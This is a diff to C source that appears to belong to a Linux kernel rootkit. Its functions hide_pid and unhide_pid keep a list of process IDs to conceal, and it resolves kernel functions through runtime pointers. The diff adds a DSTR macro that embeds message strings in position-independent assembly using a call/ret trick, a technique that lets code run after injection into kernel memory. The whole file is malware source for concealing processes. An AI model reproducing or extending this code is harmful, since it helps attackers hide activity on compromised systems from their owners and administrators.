@@ -1,4 +1,26 @@
-#define LABEL(name) asm("\t.globl\t"#name"\n\t.type\t"#name", @function\n"#name":\n\t.size\t"#name", .-"#name"\n");
+#define LABEL(name) asm( \
+"\t.globl\t"#name"\n" \
+"\t.type\t"#name", @function\n" \
+#name":\n" \
+"\t.size\t"#name", .-"#name"\n" \
+);
+
+#define DSTR(name, str) asm( \
+"\t.globl\t"#name"\n" \
+"\t.type\t"#name", @function\n" \
+#name":\n" \
+"\tcall\t"#name"_delta\n" \
+"\tret\n" \
+"\t.string\t"#str"\n" \
+"\t.size\t"#name", .-"#name"\n" \
+"\t.globl\t"#name"_delta\n" \
+"\t.type\t"#name"_delta, @function\n" \
+#name"_delta:\n" \
+"\tmov\t(%rsp), %rax\n" \
+"\tinc\t%rax\n" \
+"\tret\n" \
+"\t.size\t"#name"_delta, .-"#name"_delta" \
+);
 
 LABEL(kernel_start)
 
@@ -40,6 +62,7 @@ pid_t pid_list_pop(pid_t nr);
  * Declarations of Linux Kernel functions.
  */
 extern void * (*f_kmalloc)(size_t size, gfp_t flags);
+extern void (*f_kfree)(const void *);
 extern struct pid * (*f_find_vpid)(pid_t nr);
 extern int (*f_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args);
 extern int (*f_sys_write)(int fd, const char *mem, size_t len);
@@ -48,16 +71,20 @@ extern int (*f_sys_write)(int fd, const char *mem, size_t len);
  * Variable declarations.
  */
 extern struct pid_list_node *pid_list_head, *pid_list_tail;
-extern const char MSG_OK[], MSG_PID_NF[], MSG_PID_NH[], MSG_KM_ERR[];
+extern const char *MSG_OK(void);
+extern const char *MSG_PID_NF(void);
+extern const char *MSG_PID_NH(void);
+extern const char *MSG_KM_ERR(void);
 
 void kernel_test(void) {
 
-    pid_list_create();
+	pinfo(MSG_OK());
+    //pid_list_create();
 
-    hide_pid(3924);
-    hide_pid(3925);
+    //hide_pid(3924);
+    //hide_pid(3925);
 
-	pid_list_destroy();
+	//pid_list_destroy();
 }
 
 int hide_pid(pid_t nr) {
@@ -66,11 +93,11 @@ int hide_pid(pid_t nr) {
 	pid = f_find_vpid(nr);
 	if (pid) {
 		pid_list_push(nr);
-		pinfo(MSG_OK);
+		pinfo(MSG_OK());
 
 		return 0;
 	} else {
-		perr(MSG_PID_NF);
+		perr(MSG_PID_NF());
 	}
 
 	return -1;
@@ -78,11 +105,11 @@ int hide_pid(pid_t nr) {
 
 int unhide_pid(pid_t nr) {
 	if (pid_list_pop(nr) == nr) {
-		pinfo(MSG_OK);
+		pinfo(MSG_OK());
 
 		return 0;
 	} else {
-		perr(MSG_PID_NH);
+		perr(MSG_PID_NH());
 	}
 	
 	return -1;
@@ -98,7 +125,7 @@ void pid_list_push(pid_t nr) {
 		node->next = NULL;
 		node->nr = nr;
 	} else {
-		perr(MSG_KM_ERR, __LINE__);
+		perr(MSG_KM_ERR(), __LINE__);
 	}
 }
 
@@ -112,7 +139,7 @@ pid_t pid_list_pop(pid_t nr) {
 			if (pid_list_tail == node) {
 				pid_list_tail = prev;
 			}
-			kfree(node);
+			f_kfree(node);
 
 			return nr;
 		}
@@ -204,7 +231,7 @@ int vpfd(int fd, const char *fmt, va_list args) {
 	    old_fs = get_fs();
 	    set_fs(KERNEL_DS);
 		len = f_sys_write(fd, textbuf, len);
-		kfree(textbuf);
+		f_kfree(textbuf);
 		set_fs(old_fs);
 		return len;
 	} else {
@@ -219,13 +246,14 @@ LABEL(kernel_code_end)
  * Linux Kernel functions.
  */
 void * (*f_kmalloc)(size_t size, gfp_t flags) = NULL;
+void (*f_kfree)(const void *) = NULL;
 struct pid * (*f_find_vpid)(pid_t nr) = NULL;
 int (*f_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args) = NULL;
 int (*f_sys_write)(int fd, const char *mem, size_t len) = NULL;
-const char MSG_OK[] = "Ok\n";
-const char MSG_PID_NF[] = "PID not found.\n";
-const char MSG_PID_NH[] = "PID is not hidden.\n";
-const char MSG_KM_ERR[] = "f_kmalloc error, line %d.\n";
+DSTR(MSG_OK, "Ok\n")
+DSTR(MSG_PID_NF, "PID not found.\n")
+DSTR(MSG_PID_NH, "PID is not hidden.\n")
+DSTR(MSG_KM_ERR, "f_kmalloc error, line %d.\n")
 
 /*
  * Variable definition
